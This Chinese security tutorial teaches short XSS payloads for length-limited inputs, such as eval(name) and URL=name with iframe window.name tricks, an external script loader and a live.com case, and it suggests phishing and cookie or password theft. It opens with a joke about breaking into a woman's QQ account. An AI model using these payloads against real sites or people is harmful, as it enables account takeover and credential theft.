# Short XSS

0x00 背景
-------

* * *

关键时候长度不够怎么办？

在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，那么就把缺点变优点吧。熟话说：小是小威力好。

熟话说的好，要能长能短，收放自如。在很多的情况中，我们构造的语句是被限制在一定的字符数内。所以这个就是考验你能短的时候能不能短，能长的时候能不能长的时候到了。

0x01 现实中的悲剧
-----------

* * *

这是一个活生生的悲剧，一个平台上面，一个二逼朋友有妹子的平台账号，但是二逼朋友想进妹子的QQ空间，用平台的备注插QQ-XSS代码，但是因为限制的字符太短，最终抱头痛哭。于是就有了下图所发生：

![2013082023315075455.jpg](http://drops.javaweb.org/uploads/images/4835043ca46a1d05efd79dae74b3cbc6ecf17f18.jpg)

0x02 怎么变”短”
-----------

* * *

```
"><script>alert(1)</script> 

```

.............................27 letters?

##### Alert(1)? No Run?

#### Impossible?

### No!

在实际情况中，可以通过`<h1>`短向量或者其他的短向量去测试存在XSS的地方，为什么可以这样？HTML是一门”不太严格”的解释语言，即使没有`</h1>`，很多浏览器也照样可以解释为

```
<h1>xss</h1>

```

### `<h1>`xss

S1:

![2013082023324089066.jpg](http://drops.javaweb.org/uploads/images/f352ba743cd6776c528d5bf5c08fb661f04bd7ce.jpg)

S2:

![2013082023330469883.jpg](http://drops.javaweb.org/uploads/images/e13399fcb54cd1787480ca7031ce99de8936e1bd.jpg)

S3：

![2013082023332018566.jpg](http://drops.javaweb.org/uploads/images/db8cecb1b37363137be36ca302b66d7d6cffe142.jpg)

但是如果在攻击的时候，我往往需要用到很多标签、属性来达到我们的目的。下面列出一些比较猥琐的利用

### `<svg/onload=domain=id>`

S1:在chrome浏览器存在一个同域读取漏洞，为什么说同域呢？

S2:在chrome下如果我们访问www.baidu.com，通过控制台来设置一下域为空，document.domain=""，就会出现以下的错误。

![2013082023341576811.jpg](http://drops.javaweb.org/uploads/images/dd573f9dd89fcad448d23e0e42b5b5cc4f207245.jpg)

S3:为什么说chrome浏览器存在一个同域读取漏洞呢?下面我们通过访问www.baidu.com.来访问一下（com后面还有一个.）并设置一下域为空

```
document.domain=""

```

设置结果就会出现以下图片所示。

![2013082023344564837.jpg](http://drops.javaweb.org/uploads/images/c42e6fe5e936450ec17e2bb0b1fd1fa46eb23fb4.jpg)

S4:这个怎么利用？

首先说一个问题，就是说，在同域的情况下，DOM是互通的。就相当于我a可以写b的，b也可以同样写a的。那我们该怎么来利用呢？我们可以干很多事情，比如说重写页面钓鱼，或者盗取同域Cookie。下面我就用Chrome的控制台来演示一下这个内容读取漏洞。

S5:先来看看两段代码：

本地构造的攻击页面如下：

```
<!DOCTYPE html>
<html>
　　<body>
    <h1>这是a.com./12.html</h1>
    <svg/onload=domain=id>
　　</body>
</html>

```

存在缺陷的XSS页面如下：

```
<!DOCTYPE html>
<html>
　　<body>
    <h1>这是b.com./11.html</h1>
　　  <svg/onload=domain=id>
　　</body>
</html>

```

S6:下面我们通过访问我们构造的攻击页面，也就是a.com./12.html，然后读取domain看看，结果如下图：

![2013082023361468608.jpg](http://drops.javaweb.org/uploads/images/77b2ec98e988a773fddae429c3d825aeb875eb35.jpg)

S7:然后我们在控制台里面用window.open()方法打开打开存在缺陷的XSS页面.然后同样用domain查看域.

![2013082023365253563.jpg](http://drops.javaweb.org/uploads/images/fcef00fc5f4caf82cc2b51b2ecf7242defca8bd7.jpg)

S8:我们从上面就可以查看出，现在a.com.和b.com.都是处于同一域下面，那么就可以实现DOM相通的概念了。

S9:通过DOM重写页面测试，测试结果如下图：

![2013082023374053213.jpg](http://drops.javaweb.org/uploads/images/832891db08434db63ddbc1bae99cbc37a237bb2f.jpg)

S10:其实这个方法的用处很多，比如说我找到XXX的XSS页面，我通过把域置空，然后在自己站上构造一个页面，怎么构造就要看你的思维了，通过同域的DOM操作，可以钓鱼的方式盗取COOKIE、密码等。

### `<svg/onload=eval(name)>`

S1:先把代码文译一下：

```
<svg/onload=eval(window.name)>

```

S2:这一段代码通过svg载入的时候执行onload事件，执行的时候通过windows.name传递给eval执行，如果我们自己构造一个攻击页面，然后传递的XSS代码呢？下面看一段代码：

本地构造的攻击页面：

```
<!DOCTYPE html>
<html>
　　<body>
    <iframe src="11.html" name="alert(1)"></iframe>
　　</body>
</html>

```

存在缺陷的XSS页面：

```
<!DOCTYPE html>
<html>
　<body>
    <svg/onload=eval(name)>
　</body>
</html>

```

S3:然后运行页面，测试结果如下：

![2013082023383876930.jpg](http://drops.javaweb.org/uploads/images/1d51dd15348be456648d5fa04569ed7d3a7cd9ba.jpg)

### `<i/onclick=URL=name>`

S1:上面的代码文译一下：

```
<i/onclick=document.URL=window.name>

```

S2:其实这段代码和上一段差不多多少，这里就不截图了，简单的讲解一下。通过点击执行事件把window.name的内容给document.URL然后执行javascript代码。那么我们可以怎么利用呢？

存在缺陷的XSS页面如下：

```
<!DOCTYPE html>
<html>
    <body>
        <i/onclick=URL=name>
    </body>
</html>

```

本地构造的攻击页面如下：

```
<!DOCTYPE html>
<html>
    <body>
        <iframe src="11.html" name="javascript:alert(1)"></iframe>
    </body>
</html>

```

### `<img src=x onerror=eval(name)>`

S1:先把代码文译一下：

```
<img src=x onerror=eval(window.name)>

```

S2:邪恶的eval又来了。通过img元素的src属性出错，执行onerror事件，通过邪恶的eval执行window.name里面的代码。

S3:那我们怎么来实现呢？

本地构造的攻击页面如下：

```
<!DOCTYPE html>
<html>
    <body>
        <iframe src="11.html" name="alert(1)"></iframe>
    </body>

```

存在缺陷的XSS页面如下：

```
<!DOCTYPE html>
<html>
    <body>
        <img src="s.sx" onerror=eval(name) />
    </body>
</html>

```

其实有很多用法，当然你也可以直接:

```
<img src=x onerror=eval(alert(1)) />

```

![2013082023401581483.jpg](http://drops.javaweb.org/uploads/images/b8ad68d49f74279329a507362002a09171d91b3c.jpg)

还可以

```
<img src=x onerror=eval(变量) />

```

![2013082023410714365.jpg](http://drops.javaweb.org/uploads/images/0067bb945a40e073d9a4f6f7d9c7df14e412ac7c.jpg)

还可以通过调用元素属性，或者是程序员自写的js代码

![2013082023425551862.jpg](http://drops.javaweb.org/uploads/images/1eaa51399954ce694ed540d3bad7b8dca2e10724.jpg)

### `<img src=x onerror=with(body)createElement('script').src='[JS地址]'>`

S1:通过img元素的src属性出错，执行onerror事件.

S2:用with定位到body，通过DOM的一个createElement方法创建一个script元素，并使用script的src属性指向需要调用的外部js文件。从而达到攻击的目的。

S3:这个就不讲解了，都应该能够看懂

0x03 实例
-------

* * *

下面引用长谷川的PPT的一部分（此PPT引用经过作者同意）

![2013082023440538047.jpg](http://drops.javaweb.org/uploads/images/eaac8c3144dc348143d902e1551d1bcbbf1698d1.jpg)

![2013082023443139294.jpg](http://drops.javaweb.org/uploads/images/c2308a82d4c49e557b133565d9e908862bed0781.jpg)

通过查看源代码：

地址：

```
https://*.live.com/?param=><h1>XSSed</h1><!--





#!html
<!-- Version: "13.000.20177.00" Server: BAYIDSLEG1C38; DateTime: 2012/05/01 15:13:23 -->
<input type="hidden" value="MESSAGE: A potentially dangerous Request.QueryString value was detected from the client (param="><h1>XSSed</h1><!--").
SOURCE: System.Web FORM:" />

```

找出了XSS的原因是由错误消息引起的XSS

然后通过攻击者自己构造的页面构造XSS，并成功实现。

```
<iframe src="target" name="javascript:alert(1)">

```

（或者使用JavaScript的window.open）

最终：作者通过21个字符实现XSS（关于实现的方法请见上面的一些比较猥琐的利用元素标签）

代码为：

```
><i/onclick=URL=name>

```

当然22个字符也有很多方法(//后面为我们构造的代码开始) 20 Letters

```
<input type=hidden value=//><i/onclick=URL=name>

```

22 Letters

```
<input type=hidden value="//"><i/onclick=URL=name>">

```

17 Letters

```
<input type=text value= //onclick=URL=name>

```

![2013082023451443889.jpg](http://drops.javaweb.org/uploads/images/e9596058be555befd4c2de655d43d9921ddec0ff.jpg)

![2013082023454387143.jpg](http://drops.javaweb.org/uploads/images/a842ec1f45f4d6c43eeb229df9b9834950b4ac12.jpg)

0x04 挑战最”短”
-----------

* * *

这个活动是国外一个网站发布的，名为XSS challenge，大家有兴趣可以讨论一下 19 Letters

```
<x/x=&{eval(name)};

```

22 Letters

```
<svg/onload=eval(name)

```

最短的javascript执行代码，考验你”短”的时候到了

```
10 Letters eval(name)
9 Letters eval(URL)
8 Letters URL=name
6 Letters $(URL)

```

0x05 总结
-------

* * *

Javascript是一门很好玩的解释型语言，每次去研究这些XSS点的时候会有很多乐趣，你越不相信这个点有XSS，那么就越要去研究这个点是否有XSS。

其实呢~~~这些技术可以称为猥琐流。。。因为不是按正常的逻辑思维是想不到这些的，除非那些思想很猥琐的人。~~~~~~~

欢迎你加入猥琐这个团队，让我们一起猥琐吧。